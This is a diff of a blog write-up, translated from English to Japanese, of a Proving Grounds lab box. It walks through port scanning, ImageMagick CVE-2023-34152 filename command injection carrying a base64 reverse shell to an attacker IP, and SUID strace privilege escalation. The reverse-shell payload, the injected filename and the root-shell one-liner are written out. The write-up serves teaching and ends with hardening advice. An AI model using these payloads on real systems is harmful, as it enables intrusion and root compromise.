@@ -16,8 +16,8 @@ alt_en: /posts/pg-image/
 | OS | Linux (Ubuntu)                                               |
 | 難易度 | Easy                                                         |
 | 攻撃対象 | Web (HTTP/80)                                                |
-| 主な侵入経路 | CVE-2023-34152 — ImageMagick 6.9.6-4 shell command injection via filename |
-| 権限昇格経路 | SUID `/usr/bin/strace` → privileged shell (GTFOBins)         |
+| 主な侵入経路 | CVE-2023-34152 — ImageMagick 6.9.6-4 ファイル名経由のシェルコマンドインジェクション |
+| 権限昇格経路 | SUID `/usr/bin/strace` → 特権シェル (GTFOBins)         |
 
 ## 認証情報
 
@@ -25,9 +25,9 @@ alt_en: /posts/pg-image/
 
 ## 偵察
 
-### Port Scan (Rustscan)
+### ポートスキャン (Rustscan)
 
-We begin with a full TCP port scan using RustScan to rapidly enumerate all open ports. RustScan's speed allows it to sweep the full 1–65535 range in seconds, handing discovered ports off to Nmap for deeper interrogation. The goal here is to quickly map the attack surface before deciding where to focus enumeration efforts.
+まず RustScan を使って全 TCP ポートスキャンを行い、開放ポートを素早く列挙します。RustScan の高速性により、1～65535 の全ポートを数秒でスキャンし、発見されたポートを Nmap に渡してより詳細な調査を行います。ここでの目的は、列挙の優先順位を決める前に攻撃対象を素早くマッピングすることです。
 
 ```bash
 rustscan -a $ip -r 1-65535 --ulimit 5000
@@ -53,11 +53,11 @@ Open 192.168.104.178:22
 Open 192.168.104.178:80
 ```
 
-Two ports are open: **22 (SSH)** and **80 (HTTP)**.
+開放ポートは **22 (SSH)** と **80 (HTTP)** の 2 つです。
 
-### Service Enumeration (Nmap)
+### サービス列挙 (Nmap)
 
-With open ports identified, we run a full Nmap scan with service version detection (`-sV`), default scripts (`-sC`), OS detection (`-A`), and aggressive timing (`-T4`). We treat the host as alive with `-Pn` and save the output as XML for later reference. The HTTP title will tell us what application is running on port 80.
+開放ポートを特定したら、サービスバージョン検出 (`-sV`)、デフォルトスクリプト (`-sC`)、OS 検出 (`-A`)、積極的なタイミング設定 (`-T4`) を組み合わせた完全な Nmap スキャンを実行します。`-Pn` でホストが稼働中として扱い、後で参照できるよう出力を XML 形式で保存します。HTTP タイトルからポート 80 で動作しているアプリケーションを確認します。
 
 ```bash
 timestamp=$(date +%Y%m%d-%H%M%S)
@@ -106,28 +106,28 @@ Nmap done: 1 IP address (1 host up) scanned in 558.76 seconds
 Scan result saved to: /home/n0z0/work/scans/20260205-013634_192.168.104.178.xml
 ```
 
-Key findings:
-- **Port 22**: OpenSSH 8.2p1 (Ubuntu)
-- **Port 80**: Apache 2.4.41 — HTTP title is **"ImageMagick Identifier"**, revealing an image processing web application
+主な発見:
+- **ポート 22**: OpenSSH 8.2p1 (Ubuntu)
+- **ポート 80**: Apache 2.4.41 — HTTP タイトルは **"ImageMagick Identifier"** であり、画像処理 Web アプリケーションが稼働していることが判明
 
-### Web Enumeration
+### Web 列挙
 
-Navigating to port 80 reveals a web interface that accepts image uploads and passes them through ImageMagick for processing. The application exposes the ImageMagick version directly: **6.9.6-4**. This specific version is known to be affected by CVE-2023-34152.
+ポート 80 にアクセスすると、画像をアップロードして ImageMagick で処理する Web インターフェースが表示されます。アプリケーションは ImageMagick のバージョンを直接公開しており、**6.9.6-4** であることが確認できます。このバージョンは CVE-2023-34152 の影響を受けることが知られています。
 
 ![ImageMagick Identifier web application showing version 6.9.6-4](/assets/img/pg/image/Pasted image 20260205014752.png)
-*Caption: The web application exposes ImageMagick version 6.9.6-4 — directly disclosing the vulnerable component.*
+*キャプション: Web アプリケーションが ImageMagick バージョン 6.9.6-4 を公開しており、脆弱なコンポーネントが直接開示されています。*
 
 ## 初期足がかり
 
-### CVE-2023-34152 — ImageMagick Shell Command Injection
+### CVE-2023-34152 — ImageMagick シェルコマンドインジェクション
 
-**CVE-2023-34152** is a shell command injection vulnerability in ImageMagick versions prior to 7.1.0-48 (and the 6.x branch prior to 6.9.12-48). The vulnerability exists in the `OpenBlob()` function within `magick/blob.c`. When ImageMagick processes a filename that begins with a pipe character (`|`), it passes the filename directly to a shell via `popen()`. By crafting a malicious filename containing shell commands (e.g., using backtick substitution), an attacker can achieve arbitrary code execution on the server processing the file.
+**CVE-2023-34152** は、バージョン 7.1.0-48 未満（6.x ブランチでは 6.9.12-48 未満）の ImageMagick に存在するシェルコマンドインジェクションの脆弱性です。脆弱性は `magick/blob.c` 内の `OpenBlob()` 関数に存在します。ImageMagick がパイプ文字 (`|`) で始まるファイル名を処理する際、`popen()` を介してそのファイル名を直接シェルに渡してしまいます。シェルコマンドを含む悪意のあるファイル名（バッククォート展開など）を細工することで、攻撃者はファイルを処理するサーバー上で任意のコードを実行できます。
 
-A public PoC (SudoIndividual/CVE-2023-34152) automates the attack by generating an image file whose filename embeds a base64-encoded reverse shell payload as a backtick injection.
+公開 PoC (SudoIndividual/CVE-2023-34152) は、base64 エンコードされたリバースシェルペイロードをバッククォートインジェクションとしてファイル名に埋め込んだ画像ファイルを生成することで、攻撃を自動化します。
 
-#### Setting up the listener
+#### リスナーのセットアップ
 
-Before running the exploit, we start a netcat listener wrapped with `rlwrap` for a more comfortable shell interaction. `rlwrap` provides readline support (history, arrow keys) for the raw netcat session. We listen on port 4444, the port our payload will call back to.
+エクスプロイトを実行する前に、より快適なシェル操作のために `rlwrap` でラップした netcat リスナーを起動します。`rlwrap` は生の netcat セッションに readline サポート（コマンド履歴、矢印キー）を提供します。ペイロードのコールバック先となるポート 4444 でリッスンします。
 
 ```bash
 rlwrap -cAri nc -lvnp 4444
@@ -139,9 +139,9 @@ rlwrap -cAri nc -lvnp 4444
 listening on [any] 4444 ...
 ```
 
-#### Generating the malicious payload
+#### 悪意のあるペイロードの生成
 
-The PoC script is cloned from GitHub into a local working directory, then executed. It generates an image file whose filename contains a backtick-injected shell command. The payload is base64-encoded to avoid shell metacharacter issues. We confirm the generated file by listing the directory — the malicious filename is visible and contains the encoded reverse shell.
+PoC スクリプトを GitHub からローカルの作業ディレクトリにクローンして実行します。スクリプトは、バッククォートインジェクションされたシェルコマンドを含むファイル名の画像ファイルを生成します。ペイロードはシェルのメタ文字の問題を回避するために base64 エンコードされています。ディレクトリ一覧で生成されたファイルを確認します — エンコードされたリバースシェルを含む悪意のあるファイル名が確認できます。
 
 ```bash
 ls -la
@@ -159,18 +159,18 @@ drwxrwxr-x 7 n0z0 n0z0 4096  2月  5 02:01  .git
 -rw-rw-r-- 1 n0z0 n0z0  351  2月  5 02:11 '|smile"`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xODAvNDQ0NCAwPiYxIg==|base64 -d|bash`".png'
 ```
 
-The generated filename embeds the payload:
-- The leading `|` triggers ImageMagick's `popen()` path
-- The backtick injection runs: `echo <base64> | base64 -d | bash`
-- The base64 string decodes to: `/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.180/4444 0>&1"`
+生成されたファイル名にはペイロードが埋め込まれています:
+- 先頭の `|` が ImageMagick の `popen()` パスをトリガー
+- バッククォートインジェクションにより実行: `echo <base64> | base64 -d | bash`
+- base64 文字列のデコード結果: `/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.180/4444 0>&1"`
 
-This file is then uploaded to the web application, where ImageMagick processes the filename and executes the injected command.
+このファイルを Web アプリケーションにアップロードすると、ImageMagick がファイル名を処理してインジェクションされたコマンドを実行します。
 
-💡 **Why this works**: ImageMagick's `OpenBlob()` function checks whether a filename starts with `|` and, if so, treats the rest of the string as a shell command executed via `popen()`. This is a legitimate feature for pipe-based input, but it becomes exploitable when user-supplied filenames are passed directly to `OpenBlob()` without sanitization. The backtick substitution inside the filename is evaluated by the shell spawned by `popen()`, executing the attacker's reverse shell payload.
+💡 **なぜ有効か**: ImageMagick の `OpenBlob()` 関数はファイル名が `|` で始まるかどうかを確認し、そうであれば残りの文字列を `popen()` 経由で実行するシェルコマンドとして扱います。これはパイプベースの入力向けの正当な機能ですが、ユーザーが指定したファイル名がサニタイズなしで `OpenBlob()` に直接渡される場合に悪用可能となります。ファイル名内のバッククォート展開は `popen()` が起動したシェルによって評価され、攻撃者のリバースシェルペイロードが実行されます。
 
-#### Reverse shell received
+#### リバースシェルの受信
 
-After uploading the malicious file through the web interface, ImageMagick processes the filename and triggers the payload. The netcat listener catches the incoming connection from the server:
+Web インターフェース経由で悪意のあるファイルをアップロードすると、ImageMagick がファイル名を処理してペイロードがトリガーされます。netcat リスナーがサーバーからの接続を受け取ります:
 
 ```bash
 rlwrap -cAri nc -lvnp 4444
@@ -186,15 +186,15 @@ bash: no job control in this shell
 www-data@image:/var/www/html$
 ```
 
-We have a shell as `www-data`.
+`www-data` としてのシェルを取得しました。
 
 ## 権限昇格
 
-### SUID `strace` — GTFOBins Shell Escape
+### SUID `strace` — GTFOBins シェルエスケープ
 
-After landing on the target, we enumerate SUID binaries to find privilege escalation paths. Running a LinPEAS SUID check or a manual `find` surfaces a critical misconfiguration: `/usr/bin/strace` has the SUID bit set and is owned by root. This is documented as a GTFOBins escalation vector.
+ターゲットに着地後、権限昇格パスを見つけるために SUID バイナリを列挙します。LinPEAS の SUID チェックまたは手動の `find` を実行すると、重大な設定ミスが発見されます: `/usr/bin/strace` に SUID ビットが設定されており、root が所有者です。これは GTFOBins の権限昇格ベクターとして記録されています。
 
-The LinPEAS output highlights the finding:
+LinPEAS の出力でこの発見が強調されています:
 
 ```bash
 ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
@@ -204,9 +204,9 @@ The LinPEAS output highlights the finding:
 -rwsr-sr-x 1 root root 1.6M Apr 16  2020 /usr/bin/strace
 ```
 
-`strace` is a system call tracer. When the SUID bit is set, any call to `strace` runs with root's effective UID. According to [GTFOBins — strace](https://gtfobins.github.io/gtfobins/strace/#shell), `strace` can be used to exec an arbitrary shell by tracing a simple command. The `-o /dev/null` flag discards the trace output (avoiding a messy terminal), while `/bin/sh -p` spawns a shell that preserves the elevated effective UID.
+`strace` はシステムコールトレーサーです。SUID ビットが設定されていると、`strace` を呼び出すとすべて root の実効 UID で実行されます。[GTFOBins — strace](https://gtfobins.github.io/gtfobins/strace/#shell) によると、`strace` を使って単純なコマンドをトレースすることで任意のシェルを起動できます。`-o /dev/null` フラグでトレース出力を破棄し（ターミナルが乱れるのを防ぐ）、`/bin/sh -p` で昇格した実効 UID を保持するシェルを起動します。
 
-💡 **Why this works**: The SUID bit causes the kernel to set the process's effective UID to the binary owner's UID (root) at exec time. `strace` then calls `execve()` to launch the traced process — in this case `/bin/sh -p`. The `-p` flag instructs `sh` to retain the elevated `euid` rather than resetting it to the real UID. The result is a root shell running under `www-data`'s real UID but root's effective UID, granting full filesystem access.
+💡 **なぜ有効か**: SUID ビットにより、カーネルは exec 時にプロセスの実効 UID をバイナリ所有者の UID（root）に設定します。`strace` はその後 `execve()` を呼び出してトレース対象プロセス（この場合は `/bin/sh -p`）を起動します。`-p` フラグは `sh` に対して実 UID にリセットせず昇格した `euid` を保持するよう指示します。結果として、`www-data` の実 UID で動作しながら root の実効 UID を持つ root シェルが得られ、ファイルシステム全体へのアクセスが可能になります。
 
 ```bash
 /usr/bin/strace -o /dev/null /bin/sh -p
@@ -218,11 +218,11 @@ www-data@image:/tmp$ /usr/bin/strace -o /dev/null /bin/sh -p
 uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
 ```
 
-`euid=0(root)` confirms we are operating with root privileges.
+`euid=0(root)` により、root 権限で操作していることが確認できます。
 
-#### Root flag
+#### root フラグ
 
-With effective root privileges, we read the proof file from `/root/`:
+root 権限を取得し、`/root/` から proof ファイルを読み取ります:
 
 ```bash
 cat /root/proof.txt
@@ -235,7 +235,7 @@ uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(ww
 #
 ```
 
-## Attack Chain Overview
+## 攻撃チェーン概要
 
 ```mermaid
 flowchart LR
@@ -336,13 +336,13 @@ flowchart LR
 
 ## まとめ・学んだこと
 
-1. **Version disclosure is a critical information leak**: The web application displayed the ImageMagick version number directly in the page title. This single piece of information enabled immediate CVE lookup and targeted exploitation. Suppress version banners in production.
+1. **バージョン開示は重大な情報漏洩**: Web アプリケーションがページタイトルに ImageMagick のバージョン番号を直接表示していました。この一つの情報だけで即座に CVE 検索と標的を絞った攻撃が可能になりました。本番環境ではバージョン情報のバナーを抑制してください。
 
-2. **Never pass user-controlled filenames directly to image processing libraries**: ImageMagick's `popen()` pipe feature is a legitimate internal mechanism, but it becomes a weaponized primitive when filenames originate from user uploads. Always sanitize or reject filenames containing shell metacharacters (`|`, `` ` ``, `$`, etc.) before processing.
+2. **ユーザーが制御するファイル名を画像処理ライブラリに直接渡さない**: ImageMagick の `popen()` パイプ機能は正当な内部メカニズムですが、ファイル名がユーザーのアップロードに由来する場合は兵器化されたプリミティブになります。処理前にシェルメタ文字（`|`、`` ` ``、`$` など）を含むファイル名を常にサニタイズまたは拒否してください。
 
-3. **SUID bits on powerful utilities are high-value targets**: `strace` is a privileged debugging tool that should never have the SUID bit set on a production system. Even utilities that seem harmless can be trivially abused for privilege escalation — always cross-reference installed SUID binaries against GTFOBins.
+3. **強力なユーティリティの SUID ビットは高価値のターゲット**: `strace` は本番システムに SUID ビットを設定すべきでない特権デバッグツールです。無害に見えるユーティリティでも権限昇格のために簡単に悪用される可能性があります — インストールされた SUID バイナリを常に GTFOBins と照合してください。
 
-4. **The exploit chain was entirely toolchain-driven**: From a public PoC to a GTFOBins one-liner, this machine required no custom exploit development. Keeping software patched and hardening the post-exploit environment (removing SUID on unnecessary binaries) would have broken the chain at either step.
+4. **エクスプロイトチェーンは完全にツールチェーン主導**: 公開 PoC から GTFOBins のワンライナーまで、このマシンではカスタムエクスプロイト開発は不要でした。ソフトウェアにパッチを当て続け、エクスプロイト後の環境を強化（不要なバイナリから SUID を削除）することで、いずれかのステップでチェーンを断ち切ることができました。
 
 ## 参考文献
 
